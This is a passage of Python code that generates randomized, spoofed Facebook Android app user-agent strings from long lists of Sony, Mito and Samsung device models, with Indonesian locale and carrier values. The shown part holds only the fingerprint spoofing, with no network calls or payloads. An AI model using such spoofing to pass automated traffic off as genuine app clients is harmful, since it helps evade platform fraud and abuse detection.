X8', 'XPERIA X8', 'F3111', 'F3115', 'Xperia XA 4', 'F3112', 'F3116', 'F3211', 'F3215', 'F3216', 'F3212', 'G3112', 'G3116', 'G3121', 'G3416', 'G3412', 'G3421', 'G3426', 'G3426', 'G3221', 'G3223', 'G3226', 'G3212', 'Xperia XA1 Unlocked', 'H3113', 'H4113', 'H4133', 'H4413', 'H4493', 'H3413', 'Xperia XA2 Plus Dual (AOSP)', 'H4213', 'H3213', 'H3223', 'H4233', 'Xperia XR', 'Xperia XR', '601SO', 'F8331', 'F8332', 'SO-01J', 'G8142', 'G8141', 'SO-04J', 'SO-04K', 'Xperia XZ Premium Dual (AOSP)', 'SO-01K', 'G8341', 'G8342', 'G8343', 'Xperia XZ1 (AOSPA)', 'G8441', 'SO-02K', 'Xperia XZ1 Dual', 'Xperia XZ1 Dual (AOSP)', 'SO-03K', 'H8324', 'SOV37', '702SO', 'H8216', 'SOV37', 'SO-05K', 'SO-05K', 'H8266', 'SOV38', 'H8116', 'H8166', 'H8416', '801SO', 'SO-01L', 'H9436', 'H9493', 'Xperia XZ3 Dual (AOSP)', 'Xperia XZ4', '602SO', 'G8231', 'G8232', 'SOV35', 'SOV35', 'C6603', 'C6602', 'C6833', 'C6802', 'SonySOL24', 'C6903', 'C6902', 'SO-02F', 'C6943', 'D5503', 'Xperia Z1s', 'Xperia Z1s', 'xperia z1s', 'D6503', 'D6503', 'D6503', 'SO-03F', 'SGP561', 'SOT21', 'Xperia Z2 Tablet WiFi', 'D6563', 'xperia z2a', 'D6653', 'D6603', 'SO-01G', 'SOL26', 'D6643', 'D5803', 'SO-02G', 'D5833', 'D6633', 'D6633', 'E6533', 'E6553', 'E6533', 'Xperia Z3C', 'Xperia z3Dual', 'Xperia z3tc', 'D6708', 'SOV31', 'SGP771', 'SO-03G', '402SO', 'Xperia Z4 Tablet', 'Xperia Z4 Tablet Wifi', 'Xperia Z4 Xtreme', 'xperia z4v', 'moto e22', '501SO', 'E6653', 'SO-01H', 'E6603', 'SO-02H', 'E5823', 'E5803', 'E5823', 'E6633', 'E6683', 'E6853', 'SO-03H', 'E6883', 'E6833', 'Xperia Z5P', 'Xperia Z7', 'C6502', 'C6506', 'C6503', 'SonyC6506', 'C6503', 'SOL25', 'Xperia ZQ', 'C5503', 'C5502'])
                self.useragent = (f'[FBAN/FB4A;FBAV/{self.app_version};FBBV/{random.randint(000000000, 999999999)};FBDM/' + '{' + str(self.density) + '}' + f';FBLC/id_ID;FBRV/0;FBCR/INDOSAT;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/{self.android_model};{self.android_version};FBCA/{self.arm64_v7a};]')
            elif "Mito" in str(self.device):
                self.android_model = random.choice(['MITO A230', 'Mito A67', 'MITO_A37_Z1', 'MITO A355', 'MITO_T7', 'MITO_A36_W1'])
                self.useragent = (f'[FBAN/FB4A;FBAV/{self.app_version};FBBV/{random.randint(000000000, 999999999)};FBDM/' + '{' + str(self.density) + '}' + f';FBLC/id_ID;FBRV/0;FBCR/INDOSAT;FBMF/MITO;FBBD/MITO;FBPN/com.facebook.katana;FBDV/{self.android_model};{self.android_version};FBCA/{self.arm64_v7a};]')
            elif "Samsung" in str(self.device):
                self.android_model = random.choice(['samsung 19A', 'samsung a1', 'Samsung A10', 'Samsung A20', 'samsung A21', 'Samsung A33', 'Samsung A4', 'samsung A5', 'Samsung A50', 'Samsung A51', 'Samsung A52s', 'samsung A56', 'Samsung A7', 'samsung A7', 'Samsung A70', 'SAMSUNG A800F', 'SM-W750V', 'Trident/7.0', 'Trident/7.0', 'Samsung Chrome 11 (3180)', 'Samsung Chromebook Pro', 'Samsung Chromebook 3', 'Samsung Chromebook Plus (V2)', 'SAMSUNG F12', 'Samsung F41', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800D', 'GT-I5800', 'GT-I5800', 'SAMSUNG SM-A716S', 'SM-A015F', 'SM-A015M', 'SM-A013M', 'SM-A013F', 'SM-A013G', 'SM-A022F', 'SM-A022M', 'SM-S124DL', 'SM-A025V', 'SM-A025G', 'SM-A025F', 'SM-A025U', 'SM-A025M', 'SM-A025F', 'SAMSUNG SM-A035G', 'SM-A035M', 'SM-A035F', 'SAMSUNG SM-A035M', 'SM-A032F', 'SM-A032M', 'SM-A037U', 'SM-A037U1', 'SM-S134DL', 'SAMSUNG SM-A037F', 'SM-A037M', 'SM-A045M', 'SM-A045F', 'SAMSUNG SM-A045F', 'SM-A042F', 'SM-A042M', 'SAMSUNG SM-A042F', 'SM-A047F', 'SAMSUNG SM-A047F', 'SM-A105FN', 'SAMSUNG SM-A105FN', 'SM-A105G', 'SM-A105M', 'U', 'SM-S102DL', 'SM-A102U', 'SAMSUNG SM-A102U', 'SAMSUNG SM-A102U1', 'SM-A107M', 'SM-A107F', 'SM-A107F', 'SM-A115F', 'SM-S115DL', 'SM-A115M', 'SM-A115F', 'SAMSUNG SM-A125F', 'SM-A127F', 'SM-A125U', 'SM-A137F', 'SM-A135F', 'SM-A135U1', 'SAMSUNG SM-A135F', 'SAMSUNG SM-A137F', 'SM-A135M', 'SM-A136U', 'SM-S136DL', 'SM-A136W', 'SM-A136B', 'SM-A145R', 'SAMSUNG SM-A145R/A145RXXU1AWD1', 'SM-A145F', 'SM-A145P', 'SAMSUNG SM-A145F', 'SM-A146U', 'SM-A146P', 'SM-A146U1', 'SAMSUNG SM-A146U', 'SM-A260G', 'SM-A260F', 'SM-A260F', 'SM-A205U', 'SAMSUNG SM-A205U1', 'SM-A205F', 'SM-A205W', 'SM-A205G', 'SM-S205DL', 'SM-A205GN', 'SM-A202F', 'SAMSUNG SM-A202F', 'SM-A207F', 'SM-A207M', 'SM-S215DL', 'SM-A215U1', 'SAMSUNG SM-S215DL', 'SM-A102J', '720x1448', 'SC-42A', 'SM-A217F', 'SAMSUNG SM-A217F', 'SM-A217M', 'U', 'SM-A225F', 'SM-A225M', 'SAMSUNG SM-A225F', 'SAMSUNG SM-A226B', 'SM-A226BR', 'SM-A235F', 'SM-A235N', 'SM-A236B', 'SM-A236E', 'SM-A236U', 'SAMSUNG SM-A236M', 'SAMSUNG SM-A236U1', 'SM-A236V', 'SM-A245F', 'SAMSUNG SM-A245F', 'SM-A245M', 'Samsung Galaxy A24', 'SM-A300FU', 'SM-A300H', 'SM-A310F', 'SAMSUNG SM-A310F', 'SM-A310F', 'SM-A310M', 'SM-A320F', 'SM-A320FL', 'SAMSUNG SM-A320FL', 'SM-A305FN', 'SM-A305GN', 'SM-A305N', 'SM-A305GT', 'Flow', 'SM-A307FN', 'SM-A307GT', 'SM-A307GN', 'SM-A315G', 'SM-A315F', 'SM-A315N', 'SM-A325F', 'SM-A325M', 'SAMSUNG SM-A325F', 'SM-A326W', 'SM-A326U', 'SM-A326B', 'SAMSUNG SM-A326B', 'SM-S326DL', 'SM-A336B', 'SAMSUNG SM-A336E', 'SM-A336M', 'SM-A336N', 'SM-A346B', 'SM-A346M', 'SAMSUNG SM-A346M', 'SM-A3460', 'SM-A346E', 'SAMSUNG SM-A346B/A346BXXU1AWB9', 'SAMSUNG SM-A346E', 'SAMSUNG SM-A430F', 'SM-A405FN', 'SAMSUNG SM-A405FN', 'SM-A405FN', 'SM-A405FN/DS', 'SM-A405S', 'SM-A3050', 'SM-A3051', 'SM-A3058', 'SM-A415F', 'SC-41A', 'SM-A4260', 'SM-A426U', 'SM-A426U1', 'SM-A426U', 'SM-A426B', 'SAMSUNG SM-A426B/A426BXXU4DVL3', 'SM-A426N', 'SAMSUNG SM-A426U', 'SM-A5009', 'SM-A500YZ', 'SM-A500W', 'SM-A500L', 'SAMSUNG SM-A500W', 'SAMSUNG SM-A500L', 'SM-A500X', 'SM-A500XZ', 'SM-A500XZ', 'SM-A500XZ', 'SM-A510F', 'SAMSUNG SM-A510F', 'SM-A510F', 'SM-A520F', 'SAMSUNG SM-A520F', 'SM-A520K', 'SM-A500M', 'SM-A500H', 'SM-A500F', 'SM-A500F', 'SM-A500FU', 'SM-A505FN', 'SM-A505G', 'SM-A505FM', 'SM-A505U', 'SM-A507FN', 'SM-A515F', 'SM-A515F', 'SM-A515U', 'SM-A516U', 'SM-A516B', 'SM-A516B/DS', 'SM-A516N', 'SC-54A', 'SM-A516V', 'SCG07', 'SM-A525F', 'SAMSUNG SM-A525F', 'SM-A525M', 'SAMSUNG SM-A526B', 'SM-A526W', 'SM-A526U', 'SM-A5260', 'SM-A528B', 'SAMSUNG SM-A528B', 'SAMSUNG SM-A528B/A528BXXU3EWE1', 'SM-A536E', 'SM-A536B', 'SAMSUNG SM-A536E', 'SM-A5360', 'SM-A536U', 'SM-A536U1', 'SM-A536V', 'SAMSUNG SM-A536V', 'SM-A546U1', 'SM-A546E', 'SM-A546B', 'SM-A5460', 'SAMSUNG SM-A546U', 'SM-A546W', 'SM-A546V', 'SAMSUNG SM-A600FN', 'SM-A600G', 'SM-A605FN', 'SM-A605G', 'SM-A6050', 'SM-A605GN/DS', 'SAMSUNG SM-A605FN', 'SM-A6060', 'SM-A606Y', 'SAMSUNG SM-A606Y', 'SM-G6200', 'SM-G6200', 'SM-A7000', 'SM-A700FD', 'SM-A700K', 'SM-A700H', 'SM-A700YD', 'SM-A710F', 'SM-A7100', 'SM-A710K', 'SM-A710M', 'SM-A720F', 'SM-A750FN', 'SAMSUNG SM-A750FN', 'SM-A750N', 'SM-A750GN', 'SM-A705FN', 'SM-A705MN', 'SM-A705GM', 'SM-A705W', 'SM-A707F', 'SAMSUNG SM-A707F', 'SAMSUNG SM-A7070', 'SM-A715F', 'SM-A715W', 'SM-A715F', 'SM-A715F', 'SM-A716U', 'SM-A716U1', 'SAMSUNG SM-A716U', 'SM-A716V', 'SAMSUNG SM-A716U1', 'SM-A725F', 'SM-A725M', 'SAMSUNG SM-A725F', 'SAMSUNG SM-A736B', 'SM-A736B', 'SM-A530F', 'SAMSUNG SM-A530F', 'SM-A8000', 'SM-A810F', 'SM-A810YZ', 'SAMSUNG SM-A810YZ', 'SM-A810S', 'SM-A530N', 'SM-A530W', 'SAMSUNG SM-A530W', 'SAMSUNG SM-G885F', 'SM-G885Y', 'SAMSUNG SM-G885S', 'SAMSUNG SM-G885Y', 'samsung SM-G885F', 'SM-A730F', 'SM-A805F', 'SAMSUNG SM-A805F', 'SM-A8050', 'SM-A805N', 'SM-G8870', 'SM-G887F', 'SM-A8s', 'SAMSUNG SM-G8870', 'SM-A9000', 'SM-A920F', 'SAMSUNG SM-A920F/A920FXXS7CVI7', 'U', 'SM-A910F', 'SM-G887N', 'SM-G887N', 'SM-A910F', 'SM-A9100', 'SM-G8850', 'SAMSUNG SM-G8850', 'SM-G8858', 'SM-G8850', 'SAMSUNG SM-A908B', 'SM-A908N', 'SAMSUNG SM-A908B/A908BXXU5EVK3', 'SAMSUNG SM-A908B/A908BXXU5EVG6', 'SAMSUNG SM-A9080', 'SM-A9080', 'GT-S5830', 'GT-S5830', 'GT-S5830', 'GT-S5830', 'GT-S5830', 'GT-S5830', 'GT-S5830M', 'GT-S5830i', 'GT-S5830i', 'GT-S5830L', 'GT-S5830G', 'GT-S5830M', 'GT-S5830M', 'GT-S5830C', 'GT-S5830V', 'GT-I8160', 'GT-I8160', 'GT-I8160', 'GT-I8160P', 'GT-I8160', 'GT-I8160P-ORANGE/I8160PBVLK3', 'GT-I8160', 'GT-I8160', 'GT-I8160', 'SAMSUNG GT-I8160/I8160BOLK2', 'SAMSUNG GT-S7275R/S7275RXXUAMK2', 'SAMSUNG GT-S7275R/S7275RXXUAPA2', 'GT-S7275R', 'SAMSUNG GT-S7275R-ORANGE', 'SAMSUNG GT-S7275R/S7275RXXUAPA2', 'GT-S7275B', 'GT-S7275B', 'GT-S7275B', 'GT-S7275T', 'GT-S7275Y', 'SM-G313HY', 'SM-G313MY', 'SM-G313MU', 'SM-G316MY', 'SM-G316M', 'SM-G316ML', 'SM-G316MY', 'SM-G316ML', 'SM-G316MY', 'SM-G316ML', 'SM-G316MY', 'SM-G316MY', 'SM-G316ML', 'SM-G316MY', 'SM-G313HZ', 'SM-G313HU', 'SM-G313U', 'SM-G318H', 'GT-S7500', 'GT-S7500', 'SAMSUNG GT-S7500/S7500BUMB1', 'GT-S7500', 'GT-S7500', 'GT-S7500T', 'GT-S7500', 'GT-S7500W', 'GT-S7500T', 'GT-S7500L', 'GT-S7500L', 'GT-S7500T', 'GT-S7500L', 'GT-S7500T', 'SM-G357FZ', 'SM-G310HN', 'SAMSUNG SM-G357FZ/G357FZXXU1AOE1', 'SM-G357FZ', 'SC-01H', 'SC-01H', 'SM-G850F', 'SM-G850F', 'SM-G850M', 'SAMSUNG-SM-J327AZ', 'SAMSUNG SM-J327AZ', 'SM-J337AZ', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'SM-G386T', 'SM-G386T1', 'SM-G386T1', 'SAMSUNG SM-G386T', 'SM-G386T', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'SM-G3858', 'SM-G3858', 'SAMSUNG-SM-G3858_TD/1.0 Android/4.2.2 Release/10.15.2013 Browser/AppleWebKit534.30', 'SM-G3858', 'SM-G3858', 'SM-G3858', 'SM-A226L', 'SAMSUNG SM-A226L', 'SM-M236L', 'SAMSUNG SM-M236L', 'SM-C5000', 'SAMSUNG SM-C5000', 'SAMSUNG SM-C500X', 'SM-C5010', 'SAMSUNG SM-C5010', 'SAMSUNG SM-C5018', 'SM-C7000', 'SAMSUNG SM-C7000', 'SM-C7000', 'SM-C7010', 'SM-C701F', 'SAMSUNG SM-C7010', 'SAMSUNG SM-C701F', 'SM-C7018', 'SAMSUNG SM-C7100', 'SM-C7108', 'SAMSUNG SM-C7108', 'SM-C9000', 'SM-C900F', 'SM-C900Y', 'EK-GC100', 'EK-GC100', 'EK-GC100', 'EK-GC120', 'EK-GC200', 'EK-GC200', 'EK-GC110', 'EK-GC110', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330B', 'GT-B5330B', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330L', 'GT-I8262', 'GT-I8262', 'GT-I8262', 'GT-I8260', 'GT-I8262', 'GT-I8262B', 'GT-I8262D', 'GT-I8262D', 'GT-I8262B', 'SM-G355H', 'SM-G355M', 'SHW-M570S', 'SAMSUNG GT-I8580', 'SHW-M570S', 'SAMSUNG SHW-M570S', 'GT-I8580', 'GT-I8580', 'GT-I8580', 'SAMSUNG GT-I8580', 'SM-G3589W', 'SM-G3589W', 'SM-G3589W', 'SAMSUNG-SM-G3589W', 'SM-G386W', 'SM-G386F', 'SM-G3518', 'SM-G3586V', 'SM-G3586V', 'SM-G3518', 'SM-G3518', 'SM-G5108Q', 'SM-G5108Q', 'SM-G5108Q', 'SM-G5108Q', 'SM-G5108Q', 'SM-G5108Q', 'SM-G3568V', 'SM-G3568V', 'SM-G350E', 'SM-G350', 'SM-G3509I', 'SM-G3508J', 'SM-G3502I', 'SM-G3502C', 'SM-G360BT', 'SM-S820L', 'SM-G360H', 'SM-G360F', 'SM-G360T', 'SM-G360M', 'SM-G361H', 'SM-G361F', 'SM-G361HU', 'SAMSUNG SM-G361H', 'SCH-R740C', 'SGH-S730M', 'SGH-S730G', 'SCH-R740C', 'SCH-R740C', 'SCH-R740C', 'SCH-R740C', 'SM-E500H', 'SM-E500F', '720x1280', 'SM-E500M', 'SM-E5000', 'SM-E500YZ', 'SM-E700H', 'SM-E700F', 'SM-E7009', 'SM-E700M', 'GT-I8730', 'GT-I8730', 'GT-i8730', 'GT-I8730', 'GT-I8730', 'GT-I8730', 'GT-I8730', 'GT-I8730T', 'GT-I8730', 'GT-I8730', 'GT-I8730', 'SM-G3815', 'SAMSUNG SM-G3815/G3815XXUCOE1', 'SM-G3815', 'SAMSUNG SM-G3815/G3815XXUCNH1', 'SM-E025F', 'SM-F127G', 'SM-E135F', 'SM-E225F', 'SM-E236B', 'SAMSUNG SM-E236B', 'SM-F415F', 'SM-E426B', 'SAMSUNG SM-E426B', 'SM-E5260', 'SAMSUNG SM-E5260', 'SM-E625F', 'GT-S6810M', 'GT-S6810', 'GT-S6810P', 'GT-S6810B', 'GT-S6810L', 'GT-S6810L', 'GT-S6810E', 'GT-S6810M', 'GT-S6810L', 'GT-S6810E', 'GT-S6810M', 'GT-S6810E', 'GT-S6810M', 'GT-S6810P', 'GT-S6812C', 'GT-S6812', 'GT-S6812i', 'GT-S6812i', 'GT-S6812C', 'GT-S6812i', 'GT-S6812i', 'GT-S6812i', 'GT-S6812B', 'GT-S6812i', 'GT-S6812B', 'GT-S6812B', 'GT-S6790L', 'GT-S6790N', 'GT-S6790N', 'GT-S6790N', 'GT-S6790N', 'GT-S6790L', 'SC-04J', 'SC-02L', 'SM-F907B', 'SM-F900U', 'SM-F900F', 'SM-F907N', 'SM-F9000', 'SM-F900U1', 'SM-F900W', 'SM-G150NL', 'SM-G155S', 'SM-G150N0', 'SM-G150NS', 'SM-G1650', 'SM-W2015', 'SM-W2015', 'SAMSUNG-SM-W2015', 'GT-I9128I', 'GT-I9128I', 'GT-I9128E', 'SM-G7102', 'SM-G7102', 'SM-G7105', 'SM-G7106', 'SM-G7108', 'GT-I9082', 'GT-I9082', 'GT-I9082C', 'SM-G7202', 'SM-G720N0', 'SM-G7200', 'SM-G720AX', 'SM-G7200', 'SM-G7200', 'SM-G7200', 'SM-G720N0', 'SM-G7200', 'SM-G720AX', 'SM-G720N0', 'SM-G7200', 'SM-G7200', 'SM-G720N0', 'SM-G720N0', 'SM-G7202', 'GT-I9060', 'GT-I9060', 'GT-I9060', 'GT-I9060', 'GT-I9060', 'GT-I9060', 'GT-I9063T', 'GT-I9063T', 'GT-I9063T', 'GT-I9063T', 'GT-I9168I', 'GT-I9168I', 'SAMSUNG-GT-I9168_TD Release/1.15.2014 Browser/AppleWebKit/534.30', 'GT-I9168I', 'GT-I9168', 'GT-I9168I', 'GT-I9168', 'GT-I9168I', 'SM-G531F', 'SM-G531H', 'SM-G530T', 'SM-G530H', 'SM-G530BT', 'SM-G530FZ', 'SM-G532F', 'SM-G531M', 'SM-G531BT', 'SAMSUNG-SM-J727AZ', 'SM-J100FN', 'SM-J100H', 'SM-J120H', 'SM-J120F', 'SM-J120FN', 'SM-J120H', 'SM-J111F', 'SM-J111M', 'SM-J110H', 'SM-J111M', 'SM-J110G', 'SM-J110F', 'SM-J105B', 'SM-J105H', 'SM-J105Y', 'SM-J106F', 'SM-J106H', 'SM-J106B', 'SM-J106M', 'SM-J200GU', 'SM-J200F', 'SM-J200M', 'SM-J200H', 'SM-J260F', 'SM-J260M', 'SM-J260G', 'SM-J260FU', 'SM-J260MU', 'SM-J260Y', 'SM-J200BT', 'SAMSUNG SM-J200BT', 'SM-G532G', 'SM-G532M', 'SM-G532MT', 'SM-J250G', 'SM-J250M', 'SM-J250F', 'SM-J250Y', 'SAMSUNG SM-J260AZ', 'SM-J3109', 'SM-J320Y', 'SM-J320H', 'SM-J320G', 'SM-J320FN', 'SM-J320V', 'SM-J320M', 'SAMSUNG-SM-J320A', 'SM-J330FN', 'SAMSUNG SM-J330F', 'SAMSUNG SM-J330FN/J330FNXXS4CUD3', 'SM-J330G', 'SM-J337P', 'SM-J337V', 'SAMSUNG SM-J337W', 'SM-J337U', 'SM-J337VPP', 'SM-J337R4', 'SM-J327V', 'SM-J327P', 'SM-J327R4', 'SM-S327VL', 'SM-S337TL', 'SAMSUNG SM-S327VL', 'SM-J327VPP', 'SM-S367VL', 'SAMSUNG SM-S367VL', 'SM-S357BL', 'SM-J327T1', 'SM-J3110', 'SM-J3119S', 'SAMSUNG-SM-J3119', 'SM-S320VL', 'SM-J337T', 'SM-J400F', 'SM-J400M', 'SM-J400G', 'SM-J400M', 'SM-J410F', 'SM-J410G', 'SM-J410F', 'SM-J410F', 'SM-J410F', 'SM-J415FN', 'SM-J415GN', 'Galaxy j5', 'SM-J500M', 'SM-J500G', 'SM-J500F', 'SM-J500H', 'SM-J500FN', 'SM-J510H', 'SM-J510FQ', 'SM-J510FN', 'SM-J510MN', 'SM-J510MN', 'SM-J510GN', 'SM-J530F', 'SAMSUNG SM-J530F/J530FXXS9CUE5', 'SM-G570M', 'SM-G570F', 'SM-G570Y', 'SM-J530Y', 'SAMSUNG SM-J530G', 'SM-J600FN', 'SM-J600GT', 'SM-J610FN', 'SM-J610F', 'SM-J610G', 'SM-J710F', 'SM-J700M', 'SM-J700H', 'SM-J710MN', 'SM-J710K', 'SM-J7108', 'SM-J700F', 'SM-J700P', 'SM-J710GN', 'SM-J700T', 'SM-J700T1', 'SAMSUNG SM-J727A', 'SM-J730K', 'SM-J727R4', 'SM-J727S', 'SM-J727U', 'SM-J737T1', 'SM-J737A', 'SM-J737V', 'SAMSUNG SM-J737U', 'SM-J737R4', 'SM-J737S', 'SM-J737P', 'SM-J701F', 'SM-J701MT', 'SM-S767VL', 'SM-S757BL', 'SAMSUNG SM-S767VL', 'SM-J720F', 'SM-J720M', 'SM-G615F', 'SAMSUNG SM-G615F', 'SM-G615FU', 'SM-G615F', 'SM-G610F', 'SM-G610M', 'SM-G610Y', 'SM-G611MT', 'SM-G611FF', 'SM-G611FF', 'SM-J730G', 'SM-J730F', 'SM-J730FM', 'SM-S727VL', 'SM-S737TL', 'SAMSUNG SM-S727VL', 'SAMSUNG SM-J727T1', 'U', 'SM-J727V', 'SM-J727P', 'SM-J727VPP', 'SM-C710F', 'SAMSUNG SM-C710F', 'SM-J810F', 'SM-J810Y', 'SM-J810M', 'SM-J810G', 'SM-J810M', 'SM-J8 Plus', 'SM-J8 Pro', 'SM-J8 Pro', 'SM-J8 Pro[9]', 'SM-J8 Pro [9]', 'SM-A605K', 'SAMSUNG SM-A605K/KKS3CVH2', 'SAMSUNG SM-A605K/KKU1ARG2', 'SAMSUNG SM-A605K/KKU3CTF2', 'SM-A202K', 'SAMSUNG SM-A202K/KKS8CWA1', 'SAMSUNG SM-M336K/KSU4CWD2', 'SAMSUNG SM-M336K/KSU4CWB3', 'SAMSUNG SM-M336K/KSU3BWA2', 'SM-A326K', 'SAMSUNG SM-A326K/KSS4DWC5', 'SAMSUNG SM-A326K/KSU3CVK5', 'SAMSUNG SM-A326K/KSU4DWB7', 'SAMSUNG SM-A326K/KSS3BVI2', 'SM-C115', 'SM-C115L', 'SM-C1158', 'SAMSUNG-SM-C1158_TD Android/4.4.2 Release/04.15.2014 Browser/AppleWebKit537.36', 'SM-C115W', 'SM-C115M', 'SM-S120VL', 'SAMSUNG SM-S120VL', 'SM-M015G', 'SM-M015F', 'SAMSUNG SM-M015G', 'SAMSUNG SM-M015F', 'SM-M013F', 'SAMSUNG SM-M013F', 'SM-M017F', 'SAMSUNG SM-M017F', 'SM-M022F', 'SM-M022G', 'SM-M025F', 'SM-M025F/DS', 'SM-E045F', 'SM-M045F', 'SM-M105M', 'SM-M105F', 'SM-M105G', 'SM-M107F', 'SAMSUNG SM-M107F', 'SM-M115F', 'SM-M127F', 'SM-M127G', 'SM-M135F', 'SAMSUNG SM-M135F', 'SM-M135FU', 'SM-M135M', 'SM-M136B', 'SAMSUNG SM-M136B', 'SM-M146B', 'SAMSUNG SM-M146B', 'SM-M205F', 'SM-M205M', 'SM-M205FN', 'SM-M205F', 'SM-M215F', 'SM-M215G', 'SAMSUNG SM-M215G', 'SM-M225FV', 'SAMSUNG SM-M225FV', 'SM-M236B', 'SAMSUNG SM-M236B', 'SM-M305F', 'SM-M305M', 'SM-M305M/DS', 'SM-M305F', 'SM-M307F', 'SM-M307FN', 'SM-M3070', 'SM-M307F', 'SM-M315F', 'SM-M315F/DS', 'SM-M317F', 'SAMSUNG SM-M317F', 'SM-M317F/DSN', 'SM-M325FV', 'SAMSUNG SM-M325FV', 'SM-M326B', 'SAMSUNG SM-M326B', 'SM-M336BU', 'SAMSUNG SM-M336B', 'SM-M405F', 'SAMSUNG SM-M405F', 'SM-M426B', 'SM-M515F', 'SM-M515F/DSN', 'SM-M526BR', 'SM-M536B', 'SAMSUNG SM-M536B', 'SM-M536B', 'SM-M625F', 'SM-M625F/DS', 'SAMSUNG SM-M625F', 'SGH-I527M', 'SM-G750H', 'SM-G7508Q', 'SM-G7509', 'SAMSUNG-SM-G750A', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'SM-N970U', 'SM-N9700', 'SM-N970F', 'SM-N970U', 'SM-N971N', 'SM-N770F', 'SAMSUNG SM-N770F', 'SM-N975U', 'SM-N975F', 'SM-N975U1', 'SAMSUNG SM-N976B/N976BXXS8HWC5', 'SM-N976U', 'SM-N976N', 'SGH-I317M', 'Samsung Galaxy Note 2', 'SM-N980F', 'SAMSUNG SM-N980F', 'SAMSUNG SM-N981B', 'SM-N9810', 'SM-N981U', 'SM-N981N', 'SM-N985F', 'SAMSUNG SM-N985F', 'SM-N986U1', 'SM-N986B', 'SAMSUNG SM-N986B', 'SAMSUNG SM-N986U', 'SM-N986N', 'SM-N9008V', 'SM-N9006', 'SAMSUNG-SM-N900A', 'SM-N9005', 'SM-N900W8', 'Samsung GALAXY Note 3', 'SM-N900L', 'SM-N9009', 'SM-N900T', 'SM-N900P', 'SM-N9000Q', 'SAMSUNG SM-N9002', 'SM-N9002', 'SAMSUNG SM-N9002', 'SM-N9002', 'SM-N9002', 'SM-N9002', 'SM-9005', 'SM-9005', 'SM-N750L', 'SM-N7505', 'SM-N7502', 'SM-N7502', 'SAMSUNG SM-N7502', 'SM-N7502', 'SM-N7502', 'SAMSUNG SM-N7502', 'SM-N7502', 'SM-N7502', 'SM-N9100', 'SM-N910C', '1440x2560', 'SM-N910V', 'SM-N910H', 'SM-N910U', 'SM-N9108V', 'SM-N915FY', 'SM-N915T', 'SM-N9150', 'SM-N915G', 'SM-N915A', 'SM-N915S', 'SM-N915D', 'SM-N915W8', 'SM-N916L', 'SM-N916S', 'SM-N916K', 'SM-N916LSK', 'SM-N920C', 'SM-N920L', 'SAMSUNG SM-N920C', 'SAMSUNG-SM-N920A', 'SM-N920K', 'SM-N920S', 'SM-N920G', 'SM-N920V', 'SM-N920I', 'SM-N9208', 'SM-N930F', 'SM-N9300', 'SM-N930x', 'SM-N930P', 'SM-N930X', 'SM-N930W8', 'SM-N930V', 'SM-N930T', 'SM-N9500', 'SM-N950U', 'SM-N950F', 'SM-N950N', 'SAMSUNG SM-N950F', 'SM-N960U', 'SM-N960F', 'SM-N960U', 'SM-N960U1', 'SM-N960W', 'SC-01G', 'SCL24', 'SAMSUNG SCL24', 'SM-N935S', 'SM-N935F', 'SM-N935K', 'SM-N935L', 'N7100', 'GT-N7100', 'SAMSUNG GT-N7100', 'GT-N7100', 'GT-N7105', 'GT-N7105T', 'SAMSUNG GT-N7105/N7105XXDMC3', 'GT-N7105T', 'GT-N7105', 'GT-N7105', 'GT-N7105', 'GT-N7105', 'GT-N7105', 'Galaxy Note N8000', 'Galaxy Note20', 'SAMSUNG EK-GN120', 'SM-G550T', 'SM-G5500', 'SM-G550FY', 'SM-G5510', 'SM-G550T1', 'SM-S550TL', 'SM-G5528', 'SM-G5528', 'SM-G600FY', 'SM-G600F', 'SM-G6000', 'SM-G6100', 'SM-G610S', 'SM-G611F', 'SM-G611L', 'SM-G611S', 'SAMSUNG SM-J710FN', 'P1 Galaxy Plus', 'SM-G110M', 'SM-G110H', 'SM-G110B', 'SM-G110H', 'SM-G110H', 'GT-S5310', 'GT-S5310I', 'GT-S5310C', 'GT-S5310B', 'GT-S5310T', 'GT-S5310G', 'GT-S5310E', 'GT-S5310E', 'GT-S5310L', 'GT-S5310G', 'GT-S5310', 'GT-S5310G', 'GT-S5301B', 'GT-S5301B', 'Gt-s5301b', 'GT-S5301B', 'GT-S5301', 'GT-S5301', 'GT-S5301B', 'GT-S5301', 'GT-S5301B', 'GT-S5301', 'SAMSUNG GT-S5301/S5301XXAMA3', 'GT-S5301B', 'GT-S5301L', 'GT-B7510', 'GT-B7510B', 'GT-B7510', 'GT-B7510B', 'GT-B7510', 'GT-B7510L', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510B', 'GT-B7510', 'GT-B7510', 'SM-A826S', 'SAMSUNG SM-A826S', 'SAMSUNG SM-M536S', 'SM-G910S', 'SM-G910S', 'SM-G910S', 'SAMSUNG SM-G910S', 'GT-I9000', 'GT-I9000', 'GT-I9088', 'GT-I9000', 'GT-I9000', 'GT-I9000', 'GT-I9000', 'GT-I9008', 'GT-i9008', 'GT-I9000', 'GT-I9000', 'GT-I9000B', 'GT-I9000M', 'GT-I9000', 'GT-I9070', 'GT-I9070', 'GT-I9070', 'GT-I9070P', 'GT-I9070P', 'SAMSUNG GT-I9070/I9070BULK1', 'GT-I9070', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 